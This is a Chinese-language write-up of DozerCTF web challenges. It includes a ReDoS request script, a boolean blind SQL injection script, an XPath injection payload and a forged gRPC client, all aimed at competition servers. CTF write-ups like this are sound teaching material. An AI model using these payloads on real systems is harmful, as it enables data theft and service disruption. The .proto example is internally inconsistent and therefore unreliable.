# DozerCTF-2nd

### 2019金陵科技学院第二届网络安全竞赛web题解

### web1 果粉：

修改ua，包含iphone字符串即可。

### web2 reDos：

1. 通过.index.php.swp还原出代码。


2. 利用正则回溯机制导致的安全问题：

```
import requests
from io import BytesIO

data = {
  'greeting': BytesIO(b'Baby PHP' + b'a' * 1000000)
}

res = requests.post('http://120.27.3.220:10001/',data=data)
print(res.text)
```

### web3 babyshop:

简单的bool形盲注，没有任何过滤...

```
import requests
import string 

perm = string.ascii_uppercase + string.digits
url = "http://120.27.3.220:10002/trueorfalse.php"
itemname = ""
price = ""
counter = 99

while True:		
	counter +=1
	injectQuery = '\' or 1=1 and price = ' + str(counter) + '#'
	payload = {'search': injectQuery}
	html = requests.post(url, data=payload)
	print("Current counter: %s" % str(counter))
	if "This item exists" in html.content:
		while True:
			for i in perm:	
				injectQuery = '\' or name like \'' + itemname+i + '%\'' + ' and price = ' + str(counter) + '#'
				payload = {'search': injectQuery }
				html = requests.post(url, data=payload)
				print ("Currently checking: %s" % (itemname))
				if "This item exists" in html.content:
					itemname += i
					injectQuery = itemname + '\' and price = ' + str(counter) + '#'
					payload = {'search': injectQuery}
					html = requests.post(url, data=payload)
					if "This item exists" in html.content:
						print("Name of item: %s" % itemname)
						print ("Price of item: %s" % counter)
						exit()
```

### web4 bruteforce：

提示找字典，目录扫一波，发现：admin.php

cookie里base64解码发现：

$query="user/username[@name='".$user."']";

得知存在xpath注入，猜测参数为user

admin.php?user=%27]|//*|zzz[%27 

整理得到用户名字典

当爆破用户名成功回显为：ideal name

当骰子显示4个100点回显为:ideal status

在回显最长的两个包里有....

在用户名正确的情况下多次请求接口，当骰子达到4个100点即可得到flag。

### web5 接口测试：

本题开发知识较多，主页提示restful，了解的话应该可以想到restful的设计风格，如put-提交，post-更新，delete-删除...然后就换个请求方式得到源码。

源码里我们可以发现是flask框架，同时调用了grpc接口，实现了一些功能，/flag下的代码被注释掉了，但我们可以伪造客户端直接访问rpc接口获取flag.


首先根据客户端的代码推测处.proto文件

```
syntax = "proto3";

service ctf {
    rpc get_flag(CommonRequest) returns(GetFlagReply) {}
}

message CommonRequest {
}

message TestReply {
	string flag=1;
}
```

编译proto文件：

```
python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ./rpc.proto

生成 rpc_pb2.py 和 rpc_pb2_grpc.py文件
```


编写客户端程序：

```
import grpc
import rpc_pb2
import rpc_pb2_grpc

channel = grpc.insecure_channel("120.27.3.220:10004")
stub = rpc_pb2_grpc.ctfStub(channel)
response = stub.get_flag(rpc_pb2.CommonRequest())
print response
```

其实grpc支持多种语言，rpc框架存在的目的之一就是为了多种语言之间交互数据。客户端可以是任意一种语言编写。

grpc框架相关可以参考：

http://doc.oschina.net/grpc?t=57966